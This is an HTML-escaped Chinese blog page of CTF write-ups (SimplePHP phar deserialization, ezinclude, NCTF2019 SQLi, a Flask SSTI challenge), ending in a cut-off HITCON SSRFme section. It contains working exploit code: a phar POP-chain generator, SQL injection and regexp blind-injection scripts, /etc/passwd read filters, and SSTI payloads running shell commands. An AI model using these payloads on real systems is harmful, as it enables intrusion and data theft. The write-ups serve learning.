&lt;figure class=&#34;highlight cmake&#34;&gt;&lt;figcaption data-lang=&#34;CMake&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;title=test&amp;amp;category=test&#39;,content=&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;select&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;load_file&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;/var/www/html/flag_8946e1ff1ee3e40f.php&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;,/*&amp;amp;content=test&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/14.png&#34; alt=&#34;14&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF2018%5DComment/15.png&#34; alt=&#34;15&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到 flag。&lt;/p&gt;

 &lt;h2 id=&#34;swpuctf-2018simplephp&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#swpuctf-2018simplephp&#34;&gt;#&lt;/a&gt; [SWPUCTF 2018]SimplePHP&lt;/h2&gt;
&lt;p&gt;有读取文件，能读到如下文件：&lt;/p&gt;
&lt;p&gt;file.php?file=index.php/base.php/upload_file.php/function.php/file.php/class.php&lt;/p&gt;
&lt;p&gt;file.php 文件内容如下：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php 
header(&amp;quot;content-type:text/html;charset=utf-8&amp;quot;);  
include &#39;function.php&#39;; 
include &#39;class.php&#39;; 
ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); 
$file = $_GET[&amp;quot;file&amp;quot;] ? $_GET[&#39;file&#39;] : &amp;quot;&amp;quot;; 
if(empty($file)) &amp;#123; 
    echo &amp;quot;&amp;lt;h2&amp;gt;There is no file to show!&amp;lt;h2/&amp;gt;&amp;quot;; 
&amp;#125; 
$show = new Show(); 
if(file_exists($file)) &amp;#123; 
    $show-&amp;gt;source = $file; 
    $show-&amp;gt;_show(); 
&amp;#125; else if (!empty($file))&amp;#123; 
    die(&#39;file doesn\&#39;t exists.&#39;); 
&amp;#125; 
?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意使用的是 file_exists () 函数。&lt;/p&gt;
&lt;p&gt;class.php 文件内容如下:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
    public function __construct($name)
    &amp;#123;
        $this-&amp;gt;str = $name;
    &amp;#125;
    public function __destruct()
    &amp;#123;
        $this-&amp;gt;test = $this-&amp;gt;str;
        echo $this-&amp;gt;test;
    &amp;#125;
&amp;#125;

class Show
&amp;#123;
    public $source;
    public $str;
    public function __construct($file)
    &amp;#123;
        $this-&amp;gt;source = $file;   //$this-&amp;gt;source = phar://phar.jpg
        echo $this-&amp;gt;source;
    &amp;#125;
    public function __toString()
    &amp;#123;
        $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
        return $content;
    &amp;#125;
    public function __set($key,$value)
    &amp;#123;
        $this-&amp;gt;$key = $value;
    &amp;#125;
    public function _show()
    &amp;#123;
        if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
            die(&#39;hacker!&#39;);
        &amp;#125; else &amp;#123;
            highlight_file($this-&amp;gt;source);
        &amp;#125;

    &amp;#125;
    public function __wakeup()
    &amp;#123;
        if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
            echo &amp;quot;hacker~&amp;quot;;
            $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
        &amp;#125;
    &amp;#125;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;看到 Class 想到反序列化，但是没看到啥 unserialize () 函数&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function _show()
&amp;#123;
    if(preg_match(&#39;/http|https|file:|gopher|dict|\.\.|f1ag/i&#39;,$this-&amp;gt;source)) &amp;#123;
        die(&#39;hacker!&#39;);
    &amp;#125; else &amp;#123;
        highlight_file($this-&amp;gt;source);
    &amp;#125;

&amp;#125;
public function __wakeup()
&amp;#123;
    if(preg_match(&amp;quot;/http|https|file:|gopher|dict|\.\./i&amp;quot;, $this-&amp;gt;source)) &amp;#123;
        echo &amp;quot;hacker~&amp;quot;;
        $this-&amp;gt;source = &amp;quot;index.php&amp;quot;;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有个 WAF，不能直接查看 f1ag.php，所以需要用其他方法读取。很容易想到利用 file_get_contents 或 highlight_file 函数读取文件内容。&lt;/p&gt;
&lt;p&gt;涉及知识点：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;除了 unserialize () 来利用反序列化漏洞之外，还可以利用 phar 文件以序列化的形式存储用户自定义的 meta-data 这一特性，扩大 php 反序列化漏洞的攻击面。该方法在文件系统函数（file_exists ()、is_dir () 等）参数可控的情况下，配合 phar:// 伪协议，可以不依赖 unserialize () 直接进行反序列化操作。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;受影响的函数如下：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这道题满足这几个条件：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;存在受影响的函数 file_get_contents、file_exists。&lt;/li&gt;
&lt;li&gt;phar 文件能够上传到服务器端。&lt;/li&gt;
&lt;li&gt;没有过滤【:】、【/】、【pchar】等关键词。&lt;/li&gt;
&lt;li&gt;有可用的魔术方法作为 “跳板”。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;file_get_contents () 函数是 file_get 方法中的，file_get 方法在 get 方法中被调用，get 方法在__get 魔术方法中被触发：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;__get：当希望访问某个对象的未定义的或者不可访问的属性不报错，我们可以在类里定义__get 方法，这样系统在此刻会自动调用该方法&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;因此要考虑触发__get 魔术方法，访问一个 Test 类中不存在的属性。&lt;/p&gt;
&lt;p&gt;Show 类有这么一段代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public $source;
public function __toString()
&amp;#123;
    $content = $this-&amp;gt;str[&#39;str&#39;]-&amp;gt;source;
    return $content;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;__toString：用于一个类被当成字符串时应怎样回应。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这里的 source 属性是在 Show 类里的，Test 类里并不存在，因此 str [‘str’] = new Test () 可以触发__get 魔术方法。&lt;/p&gt;
&lt;p&gt;接下来考虑触发__toString () 类，找到能输出东西的地方，在 C1e4r 类里有如下代码：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;public function __destruct()
&amp;#123;
    $this-&amp;gt;test = $this-&amp;gt;str;
    echo $this-&amp;gt;test;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;它会在某个对象的所有引用都被删除或者当对象被显式销毁时执行。&lt;/p&gt;
&lt;p&gt;最后总结思路如下：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;通过 C1e4r 类，将 str 赋值为 show 类。（$this-&amp;gt;test = $this-&amp;gt;Show）&lt;/li&gt;
&lt;li&gt;C1e4r 类最后会 echo $this-&amp;gt;test; 触发 Show 类的__toString () 魔术方法&lt;/li&gt;
&lt;li&gt;__toString () 魔术方法执行 $content = this-&gt;str[‘str’]-&gt;source;将str[‘str’]赋值为Test类，Test类中不存在source属性，触发Test类的__get(key) 魔术方法。&lt;/li&gt;
&lt;li&gt;因为 $value = &lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math xmlns=&#34;http://www.w3.org/1998/Math/MathML&#34;&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mi&gt;h&lt;/mi&gt;&lt;mi&gt;i&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;mo&gt;&amp;gt;&lt;/mo&gt;&lt;mi&gt;p&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;r&lt;/mi&gt;&lt;mi&gt;a&lt;/mi&gt;&lt;mi&gt;m&lt;/mi&gt;&lt;mi&gt;s&lt;/mi&gt;&lt;mo stretchy=&#34;false&#34;&gt;[&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;this-&amp;gt;params[&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.77777em;vertical-align:-0.08333em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;h&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;i&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;p&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34; style=&#34;margin-right:0.02778em;&#34;&gt;r&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;a&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;m&lt;/span&gt;&lt;span class=&#34;mord mathnormal&#34;&gt;s&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;[&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;key]; 所以 params=array (‘source’=&amp;gt;’/var/www/html/fl1g.php’);&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;exp 如下：&lt;/p&gt;
&lt;p&gt;需要将 php.ini 中的 phar.readonly 选项设置为 Off，PHPstudy 版本切换 5.5.38。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;lt;?php
class C1e4r
&amp;#123;
    public $test;
    public $str;
&amp;#125;
class Test
&amp;#123;
    public $file;
    public $params;
    public function __construct()
    &amp;#123;
        $this-&amp;gt;params = array();
    &amp;#125;
    public function __get($key)
    &amp;#123;
        return $this-&amp;gt;get($key);
    &amp;#125;
    public function get($key)
    &amp;#123;
        if(isset($this-&amp;gt;params[$key])) &amp;#123;
            $value = $this-&amp;gt;params[$key];
        &amp;#125; else &amp;#123;
            $value = &amp;quot;index.php&amp;quot;;
        &amp;#125;
        return $this-&amp;gt;file_get($value);
    &amp;#125;
    public function file_get($value)
    &amp;#123;
        $text = base64_encode(file_get_contents($value));
        return $text;
    &amp;#125;
&amp;#125;
class Show
&amp;#123;
    public $source;
    public $str;
&amp;#125;
$phar = new Phar(&amp;quot;1.phar&amp;quot;); //后缀名必须为phar
$phar-&amp;gt;startBuffering();
$phar-&amp;gt;setStub(&amp;quot;&amp;lt;?php __HALT_COMPILER(); ?&amp;gt;&amp;quot;); 
// 可以理解为一个标志，格式为xxx&amp;lt;?php xxx; __HALT_COMPILER();?，前面内容不限，但必须以__HALT_COMPILER();?来结尾，否则phar扩展将无法识别这个文件为phar文件
$t = new Test();
$t-&amp;gt;params = array(&amp;quot;source&amp;quot;=&amp;gt;&amp;quot;/var/www/html/f1ag.php&amp;quot;);
$s = new Show();
$s-&amp;gt;str = array(&amp;quot;str&amp;quot;=&amp;gt;$t);
$c = new C1e4r();
$c-&amp;gt;str = $s;
$phar-&amp;gt;setMetadata($c); //将自定义的meta-data存入manifest
$phar-&amp;gt;addFromString(&amp;quot;test.txt&amp;quot;, &amp;quot;test&amp;quot;); //添加要压缩的文件
//签名自动计算
$phar-&amp;gt;stopBuffering();
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;抓包上传改后缀：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/wIq9Vx.png&#34; alt=&#34;wIq9Vx&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到文件路径，通过查看 function.php 可得知文件存在 upload 文件夹内，恰好这个文件夹可以访问 qwq。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;file.php?file=phar://upload/090b0844ab952f0df2b28e1f9bc24dad.jpg&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BSWPUCTF2018%5DSimplePHP/woSN5R.png&#34; alt=&#34;woSN5R&#34;&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;base64 解码得到 flag&lt;/p&gt;
&lt;p&gt;出自：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuc2hhd3Jvb3QuY2MvMTE0MS5odG1s&#34;&gt;https://www.shawroot.cc/1141.html&lt;/span&gt;&lt;/p&gt;

 &lt;h2 id=&#34;npuctf2020ezinclude&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#npuctf2020ezinclude&#34;&gt;#&lt;/a&gt; [NPUCTF2020]ezinclude&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;进去发现是用户名与密码错误&lt;/p&gt;
&lt;p&gt;F12 发现提示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;要 md5name 后的字符串等于 pass，不知道 pass，可以 bp 发现传送回来的东西有 hash 这个东西&lt;/p&gt;
&lt;p&gt;直接加入 pass 等于这个 hash 值得到：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;得到 flflflflag.php 这个文件。&lt;/p&gt;
&lt;p&gt;但是他会直接进到 404.html 文件&lt;/p&gt;
&lt;p&gt;然后就不会了；接着就是大佬的操作了：&lt;/p&gt;
&lt;p&gt;大佬看到了 php 的版本 7.0.33，直接就是：&lt;/p&gt;
&lt;h4 id=&#34;php7-segment-fault特性&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#php7-segment-fault特性&#34;&gt;#&lt;/a&gt; php7 segment fault 特性&lt;/h4&gt;
&lt;p&gt;扫目录可得 dir.php&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;…… 扫不出来&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;向 PHP 发送含有文件区块的数据包时，让 PHP 异常崩溃退出，POST 的临时文件就会被保留&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;php &amp;lt; 7.2&lt;br&gt;
php://filter/string.strip_tags/resource=/etc/passwd&lt;/li&gt;
&lt;li&gt;php7 老版本通杀&lt;br&gt;
 php://filter/convert.quoted-printable-encode/resource=data://,% bfAAAAAAAAAAAAAAAAAAAAAAA% ff% ff% ff% ff% ff% ff% ff% ffAAAAAAAAAAAAAAAAAAAAAAAA&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;嫖个脚本：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import requests
from io import BytesIO

mode1 = &amp;quot;php://filter/string.strip_tags/resource=/etc/passwd&amp;quot;
mode2 = &amp;quot;php://filter/convert.quoted-printable-encode/resource=data://,%bfAAAAAAAAAAAAAAAAAAAAAAA%ff%ff%ff%ff%ff%ff%ff%ffAAAAAAAAAAAAAAAAAAAAAAAA&amp;quot;
url = &amp;quot;http://93fed8e6-341b-499c-b41b-0f0a6288549b.node4.buuoj.cn:81/flflflflag.php?file=&amp;quot;

url = url + mode1
payload = &amp;quot;&amp;lt;?php phpinfo();?&amp;gt;&amp;quot;

files = &amp;#123;
    &amp;quot;file&amp;quot;: BytesIO(payload.encode())
&amp;#125;

res = requests.post(url=url, files=files, allow_redirects=False)

print(res.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;访问 dir.php：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;有个文件名，访问本地 file=/tmp/phpBWqZND&lt;/p&gt;
&lt;p&gt;该脚本写了一个 php 探针：直接 bp 访问该文件&lt;/p&gt;
&lt;p&gt;因为直接访问好像不能打开，会直接跳转到 404.html 文件里面，无法访问 php 探针。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNPUCTF2020%5Dezinclude/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取 flag，完成撒花～～～～～～～～&lt;/p&gt;

 &lt;h2 id=&#34;nctf2019sqli&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#nctf2019sqli&#34;&gt;#&lt;/a&gt; [NCTF2019]SQLi&lt;/h2&gt;
&lt;p&gt;源码泄露：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;找到 hint.php&lt;/p&gt;
&lt;p&gt;目的明确：&lt;/p&gt;
&lt;p&gt;只要密码是 admin 的密码就可以获得 flag&lt;/p&gt;
&lt;p&gt;得到提示，这题过滤了好多关键字，只要 password 的密码等于 admin 的密码就能拿到 flag 了，但是怎么拿呢？看了 dalao 的 wp 才发现有 regexp 注入&lt;/p&gt;
&lt;h3 id=&#34;regexp注入正则注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#regexp注入正则注入&#34;&gt;#&lt;/a&gt; regexp 注入（正则注入）&lt;/h3&gt;
&lt;p&gt;这个注入方式呢相当于&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlQjglODMlRTUlQjAlOTQlRTclOUIlQjIlRTYlQjMlQTgmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;布尔盲注&lt;/span&gt;吧，若是猜对了就返回正确的页面，我们本地测试一下正则，先看一下全部数据，然后 ^ 匹配 e 开头的 password&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;再找个 a 开头的：没有&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;分析&lt;br&gt;
回到题目里，提示给了串 SQL 语句&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;&#39; and passwd=&#39;&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;想要猜解 admin 的密码需要用到 admin，可是题目过滤掉了 admin，但是我们能用其他方法绕过，让 username=\，将语句后面的单引号给转义掉，我们可以构造这样的 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||sql;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;因为题目过滤掉了空格，空格能用内联注释符 /**/ 代替&lt;/p&gt;
&lt;p&gt;注释符 #和 --  被过滤掉了，这里用；%00 截断注释后面的内容&lt;/p&gt;
&lt;p&gt;放入原查询语句相当于&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where username=&#39;\&#39; and passwd=&#39;||sql;%00&#39;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;即&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;select * from users where sql;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这时候就能利用正则进行注入了构建 payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;username=\&amp;amp;passwd=||/**/passwd/**/regexp/**/&amp;quot;^x&amp;quot;;%00
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;相当于&lt;/p&gt;
&lt;figure class=&#34;highlight sql&#34;&gt;&lt;figcaption data-lang=&#34;SQL&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;from&lt;/span&gt; users &lt;span class=&#34;token keyword&#34;&gt;where&lt;/span&gt; &lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;passwd&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;regexp&lt;/span&gt;&lt;span class=&#34;token comment&#34;&gt;/**/&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;^x&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;%&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;00&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;先用 burpsuite 跑一下（注意该一下爆破频率，不然 429），看看正确与错误的情况，好写脚本跑&lt;br&gt;
&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/5.png&#34; alt=&#34;5&#34;&gt;&lt;/p&gt;
&lt;p&gt;跑完后发现错误的话会有个 js 的弹窗出来，跑对了就没有 ，这里可以看到密码第一位是 y（或 Y，不区分大小写），以此写个 python 脚本&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;#buuctf web [NCTF2019]SQLi
import requests
import string


url = &amp;quot;http://2e2494c3-b85d-49f4-81b8-63ee389a9c30.node4.buuoj.cn:81/&amp;quot;
pw_fuzz = string.ascii_lowercase + string.digits + &amp;quot;_&amp;quot;      #密码字典：小写字母和数字还有下划线
pw = &amp;quot;&amp;quot;     #admin的密码


while True:
    for i in pw_fuzz:
        data=&amp;#123;
            &#39;username&#39;:&#39;\\&#39;,
            &#39;passwd&#39;:&#39;||/**/passwd/**/regexp/**/&amp;quot;^&amp;#123;&amp;#125;&amp;quot;;\x00&#39;.format((pw+i))
        &amp;#125;
        res = requests.post(url=url,data=data).text
        if &amp;quot;alert&amp;quot; not in res:
            pw = pw + i
            print(pw)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/6.png&#34; alt=&#34;6&#34;&gt;&lt;/p&gt;
&lt;p&gt;交到密码获得 flag：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BNCTF2019%5DSQLi/7.png&#34; alt=&#34;7&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;rootersctf2019i_️_flask&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rootersctf2019i_️_flask&#34;&gt;#&lt;/a&gt; [RootersCTF2019]I_❤️_Flask&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/1.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;p&gt;arjun 工具用于&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/2.png&#34; alt=&#34;2&#34;&gt;&lt;/p&gt;
&lt;p&gt;这题没有过滤，直接用常规的注入语句即可&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?name=&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;].eval(&#34;__import__(&#39;os&#39;).popen(&#39;cat flag.txt&#39;).read()&#34;) &amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;拿到 flag&lt;br&gt;
&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;p&gt;在该文件同地址的模板是这样的：&lt;/p&gt;
&lt;p&gt;但是如果是根目录就是：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;
&amp;#123;% if c.__name__ == &#39;catch_warnings&#39; %&amp;#125;
  &amp;#123;% for b in c.__init__.__globals__.values() %&amp;#125;
  &amp;#123;% if b.__class__ == &amp;#123;&amp;#125;.__class__ %&amp;#125;
    &amp;#123;% if &#39;eva&#39;+&#39;l&#39; in b.keys() %&amp;#125;
      &amp;#123;&amp;#123; b[&#39;eva&#39;+&#39;l&#39;](&#39;__impor&#39;+&#39;t__&#39;+&#39;(&#34;o&#39;+&#39;s&#34;)&#39;+&#39;.pope&#39;+&#39;n&#39;+&#39;(&#34;ls /&#34;).read()&#39;) &amp;#125;&amp;#125;
    &amp;#123;% endif %&amp;#125;
  &amp;#123;% endif %&amp;#125;
  &amp;#123;% endfor %&amp;#125;
&amp;#123;% endif %&amp;#125;
&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还可以：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;% for c in [].__class__.__base__.__subclasses__() %&amp;#125;&amp;#123;% if c.__name__==&#39;catch_warnings&#39; %&amp;#125;&amp;#123;&amp;#123; c.__init__.__globals__[&#39;__builtins__&#39;][&#39;__imp&#39;+&#39;ort__&#39;](&#39;o&#39;+&#39;s&#39;).listdir(&#39;/&#39;)&amp;#125;&amp;#125;&amp;#123;% endif %&amp;#125;&amp;#123;% endfor %&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;还可以用 fenjing 直接秒了：&lt;/p&gt;
&lt;p&gt;使用方法博客上有：&lt;/p&gt;
&lt;p&gt;直接秒了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;../images/%5BRootersCTF2019%5DI_3_Flask/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;

 &lt;h2 id=&#34;hitcon-2017ssrfme&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#hitcon-2017ssrfme&#34;&gt;#&lt;/a&gt; [HITCON 2017]SSRFme&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;127.0.0.1&amp;lt;?php
    if (isset($_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;])) &amp;#123;
        $http_x_headers = explode(&#39;,&#39;, $_SERVER[&#39;HTTP_X_FORWARDED_FOR&#39;]);
        $_SERVER[&#39;REMOTE_ADDR&#39;] = $http_x_headers[0];
    &amp;#125;

    echo $_SERVER[&amp;quot;REMOTE_ADDR&amp;quot;];

